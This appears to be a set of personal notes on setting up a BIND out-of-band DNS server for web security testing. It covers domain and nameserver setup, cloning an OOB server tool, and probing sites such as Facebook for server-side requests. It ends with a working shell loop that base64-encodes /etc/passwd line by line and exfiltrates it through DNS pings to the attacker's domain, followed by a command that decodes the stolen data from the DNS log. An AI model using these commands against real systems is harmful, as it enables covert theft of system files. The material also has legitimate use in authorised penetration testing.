# Bind Server Setup
https://www.youtube.com/watch?v=p8wbebEgtDk&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549&index=6

Need:
1. Domain Name 
2. Cloud VM (AWS, Azure, etc.) Setup
3. Setup NS 
  - add host name to go daddy and put in the IP of the cloud VM. 
  - add name server ns1.<FQDN>, 1.1.1.1, 8.8.8.8, 8.8.4.4
  - https://dcc.godaddy.com/manage/<FQDN>/dns/hosts
      - Host: ns1
      - IP: from AWS
  - https://dcc.godaddy.com/manage/<FQDN>/dns
      - Namerservers: ns1.Strat0m.com , one.one.one.one
4. Download PEM file and chmod 400 
5. setup firewall rules
6. git clone https://github.com/JuxhinDB/OOB-Server.git
  ```
  sudo ./setup <FQDN> <Cloud-VM-IP>
  sudo tail -f /var/log/named/named.log
  ```
7. test with: 
  ```
  ping hello.<FQDN>
  ```
8. use for SSR. 
  Example: go to facebook and post the link http://helloFB.<FQDN> and check to see if facebooks internal systems are connecting back to your DNS server. 
9. Grep the log file for key words related to your attempted exploits.   
  
  
# Encode and exfiltrate data:
```
for i in $(cat /etc/passwd); do key=$(echo "$i" | base64 | sed 's/=//g'); ping -c 1 $key.<FQDN>; done
```

# Decode and retrieve the information:
```
for i in $(cat /var/log/named/named.log); do echo $i | awk '$1 ~ "<FQDN>" { gsub(".<FQDN>",""); print $1}' | base64 -d -i >> info.txt; done
```
